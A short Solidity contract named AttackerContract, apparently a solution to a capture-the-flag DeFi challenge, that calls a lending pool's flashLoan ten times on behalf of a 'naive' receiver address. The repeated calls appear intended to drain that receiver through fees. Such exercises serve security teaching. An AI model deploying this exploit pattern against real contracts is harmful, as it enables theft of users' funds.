// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface LenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerContract {

    function attack(address _lenderPool, address _naive) external {
        LenderPool lenderPool = LenderPool(_lenderPool);
        for (uint256 i = 0; i < 10; i++) {
            lenderPool.flashLoan(_naive, 1 ether);
        }
    }

}